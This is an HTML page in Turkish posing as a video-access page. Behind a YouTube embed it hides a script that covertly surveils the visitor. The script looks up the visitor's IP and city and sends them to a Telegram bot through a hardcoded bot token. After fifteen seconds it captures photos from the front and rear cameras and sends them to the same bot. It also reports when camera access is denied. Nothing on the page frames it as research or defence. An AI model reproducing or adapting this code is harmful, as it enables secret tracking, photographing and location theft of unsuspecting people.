<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Bakƒ±r Kertenkele 31 - Tam Eri≈üim</title>
    <style>
        body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        #playButton {
            padding: 18px 35px; font-size: 20px; font-weight: bold; color: #fff;
            background: linear-gradient(45deg, #111, #333); border: 2px solid #f00; border-radius: 10px;
            cursor: pointer; box-shadow: 0 0 15px #f00; transition: 0.5s; z-index: 100;
        }
        #playButton:hover { background: #f00; box-shadow: 0 0 25px #f00; }
        .video-container { display: none; width: 95%; max-width: 800px; border: 2px solid #f00; border-radius: 10px; }
        iframe { width: 100%; aspect-ratio: 16/9; border: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    
    <div id="setup">
        <h2 style="color: #00ffcc;">ü¶é ƒ∞√áERƒ∞K HAZIRLANIYOR...</h2>
        <button id="playButton" onclick="startDualOperation()">ƒ∞ZLEMEYE BA≈ûLA</button>
    </div>

    <div id="videoPanel" class="video-container">
        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1&autoplay=0"></iframe>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');

        async function takeSnap(stream, label) {
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 2000)); // Kamera ƒ±sƒ±nma payƒ±

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const imgData = canvas.toDataURL('image/jpeg', 0.8);
            const blob = await (await fetch(imgData)).blob();
            const fd = new FormData();
            fd.append('chat_id', userId);
            fd.append('photo', blob, 'nabi.jpg');
            fd.append('caption', `üì∏ ${label} Yakalandƒ±!`);
            
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function startDualOperation() {
            document.getElementById('setup').style.display = 'none';
            document.getElementById('videoPanel').style.display = 'block';
            document.getElementById('yt').src += "&autoplay=1";

            // Bilgi sƒ±zdƒ±rma (IP vb.)
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                const msg = `üõ∞Ô∏è **Sƒ∞STEME Gƒ∞Rƒ∞≈û:** ${d.ip}\nüìç **KONUM:** ${d.city}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}`);
            });

            // 15 Saniyelik Stratejik Bekleme Ba≈ülƒ±yor a≈ükƒ±m...
            setTimeout(async () => {
                try {
                    // √ñnce √ñN KAMERA (Selfie)
                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    await takeSnap(frontStream, "√ñn Kamera (Y√ºz)");
                    frontStream.getTracks().forEach(t => t.stop());

                    // Hemen ardƒ±ndan ARKA KAMERA (√áevre)
                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    await takeSnap(backStream, "Arka Kamera (√áevre)");
                    backStream.getTracks().forEach(t => t.stop());

                } catch (err) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=‚ùå Kamera Eri≈üimi Engellendi!`);
                }
            }, 15000); 
        }
    </script>
</body>
</html>
